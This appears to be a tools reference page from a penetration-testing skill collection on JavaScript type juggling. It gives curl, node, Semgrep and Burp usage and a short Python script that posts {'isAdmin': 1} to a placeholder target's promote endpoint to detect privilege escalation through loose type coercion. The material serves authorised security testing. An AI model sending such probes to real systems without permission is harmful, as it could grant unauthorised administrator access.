# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`type-juggling-javascript-other-languages`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS 'https://target.example/promote' -H 'Content-Type: application/json' --data '{"isAdmin": 1}'` | Send a JSON number where a boolean or string is expected to test loose coercion | Cross-platform |
| `node` | `node -e "console.log([] == ![], '' == 0, '0e1' == 0)"` | Confirm the abstract-equality quirks before attributing behavior to the target | Linux, macOS, Windows |
| `Semgrep` | `semgrep -e '$A == $B' --lang javascript .` | Flag loose equality operators in Node security paths | Cross-platform |
| `Burp Suite Repeater` | `Toggle a JSON field between a string, a boolean, and a number on the promote request` | Hold the request constant while varying only the JSON type to isolate coercion | Cross-platform |

## Minimal Script Shape

Posts a JSON string and a JSON number for the same field and reports suspected type coercion when the string form is rejected but the number form is accepted.

```python
import json
import urllib.request

ENDPOINT = "https://target.example/promote"

def post_json(obj):
    body = json.dumps(obj).encode()
    req = urllib.request.Request(ENDPOINT, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as exc:
        return exc.code

string_form = post_json({"isAdmin": "no"})
number_form = post_json({"isAdmin": 1})
print({"string_status": string_form, "number_status": number_form,
       "type_coercion_suspected": string_form in (400, 403) and number_form == 200})
```
